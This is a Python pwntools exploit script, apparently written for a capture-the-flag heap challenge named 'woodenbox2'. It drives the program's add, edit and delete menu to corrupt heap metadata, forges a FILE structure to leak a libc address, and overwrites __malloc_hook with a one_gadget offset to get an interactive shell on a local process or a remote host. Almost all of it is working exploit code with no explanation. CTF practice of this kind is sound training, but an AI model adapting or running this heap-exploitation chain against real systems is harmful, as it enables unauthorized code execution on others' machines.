#coding=utf-8

##########################################################################
# File Name: pwn_exp.py
# Author: sofr
# mail: rainb0w.541.bai@gmail.com
# Created Time: Sat Mar  7 02:20:54 2020
#########################################################################

from pwn import *
import sys
context.log_level = 'debug'

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
s = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sf = lambda x,y:p.sendafter(x,y)
slf = lambda x,y:p.sendlineafter(x,y)
l64_addr = lambda x:u64(x.ljust(0x8,'\x00'))
l32_addr = lambda x:u32(x.ljust(0x4,'\x00'))
drop_end = lambda x,y:x.split(y)[0]
getshell = lambda :p.interactive()

binary='./woodenbox2'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_name = './libc6_2.23-0ubuntu11_amd64.so'


global p
libc = ELF(libc_name)
bin = ELF(binary)


def ShowAddress(s,addr):
    print('\033[1;31m%s: 0x%x\033[0m'%(s,addr))

def Success(context):
    success('\033[1;32m%s\033[0m'%(context))

def Error(context):
    warn('\033[1;31m%s\033[0m'%(context))

def debug():
    Success(pidof(p))
    raw_input('\033[1;31mDeBug\033[0m')

def add(size,content):
    slf("Your choice:","1")
    slf("Please enter the length of item name:",str(size))
    sf("Please enter the name of item:",content)

def edit(idx,size,content):
    slf("Your choice:","2")
    slf("Please enter the index of item:",str(idx))
    slf("Please enter the length of item name:",str(size))
    sf("item:",content)

def dele(idx):
    slf("Your choice:","3")
    slf("Please enter the index of item:",str(idx))

def pwn():
    global p
    if len(sys.argv) > 1:
        p=remote(sys.argv[1],int(sys.argv[2]))
    else:
        p=process([binary],env={'LD_PRELOAD':libc_name})
    add(0x10,"a")
    add(0x10,"a")
    add(0x10,"a")
    add(0x30,"b")
    add(0x60,"c")
    add(0x10,"a")
    dele(4)
    edit(1,0x20,p64(0xdeadbeef)*2+p64(0)+p64(0xb1))
    dele(2)
    #dele(2)
    add(0x30,"a")
    edit(1,0x48,p64(0)*7+p64(0x71)+"\xdd\x55")
    #debug()
    add(0x60,"c")
    fake_file = p64(0xfbad1800) + p64(0)*3 + "\x28"
    add(0x60,'\x00'*3+p64(0)*6+fake_file)
    recv = ru('\x7f')
    print recv
    libc_addr = l64_addr(recv[-6:]) - 0x3c5628
    ShowAddress("libc",libc_addr)
    dele(2)
    edit(0,0x48,p64(0)*7+p64(0x71)+p64(libc_addr+0x3c4afd))
    add(0x60,"c")
    one = 0x45216
    one = 0x4526a
    one = 0xf02a4
    #one = 0xf1147
    add(0x60,'\x00'*3+p64(libc_addr+one))
    

    debug()
    getshell()
for i in xrange(30):
    try:
        global p
        pwn()
        break
    except:
        global p
        p.close()
